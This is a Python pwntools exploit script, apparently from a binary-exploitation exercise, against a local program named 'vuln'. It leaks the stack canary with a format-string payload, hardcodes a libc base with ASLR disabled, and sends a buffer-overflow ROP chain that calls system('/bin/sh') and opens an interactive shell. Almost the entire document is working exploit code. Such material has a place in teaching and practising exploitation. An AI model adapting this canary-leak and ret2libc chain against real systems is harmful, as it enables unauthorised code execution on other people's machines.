# import pwntools scripts and functions
from pwn import *

# Start the vulnerable program
p = process('./vuln')

# Define the vulnerable prgram as an Executable and Linkable Format allowing 
# access by pwntools to the programs compiled structure and parts.
program = ELF('./vuln')
context.binary = program

# Create the ROP object - from pwntools.
rop = ROP(program) 

# Wait until the string is received before sending the first exploit.
p.recvuntil(b"canaryLeak:")
# Leak the canary
p.sendline(b"%39$llx")  # Format string to leak stack canary
canary = int(p.recvline().strip(), 16)
log.info(f"Leaked canary: {hex(canary)}")
print(f"Leaked canary: {hex(canary)}")

# Define the location of libc on the local computer.
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

### Your systems libc address should go here. ###
libc.address = 0x00007ffff7dc4000 # Libc base address on my system without ASLR.

# Identify system(), "/bin/sh" and ROP Gadget in libc and cacuate their address
# Leading 0's left in place to indicate 64bit addressing, but can be omitted in Python.
poprdi = libc.address + 0x0000000000028215 # using ROPgadget - offset from libc base
ret = libc.address + 0x000000000002668c # using ROPgadget - offset from libc base
system = libc.address + 0x000000000004dab0 # using 'readelf' - offset from libc base
binsh = libc.address + 0x0000000000197e34 # using 'strings' - offset from libc base

# Generate the ROP Chain
rop.raw(b"A"*72)  # Fill the buffer to cause an overflow
rop.raw(canary)    # Retain the stack canary value to avoid stack smashing error
rop.raw(b"B"*8)    # Bytes used for stack alignment
rop.raw(poprdi) # pop rdi from libc
rop.raw(binsh) # /bin/sh address from libc
rop.raw(ret)  # ret from libc
rop.raw(system) # system from libc

rop_chain = rop.chain()

# Send the ROP chain and get a shell
p.recvuntil(b"getShell:")
p.sendline(rop_chain) # Send the exploit to ./vuln

# Write the ROP chain to a file - to use with debugger
with open('rop_chain.txt', 'wb') as f:
    f.write(rop_chain)

p.interactive()  # Get an interactive shell
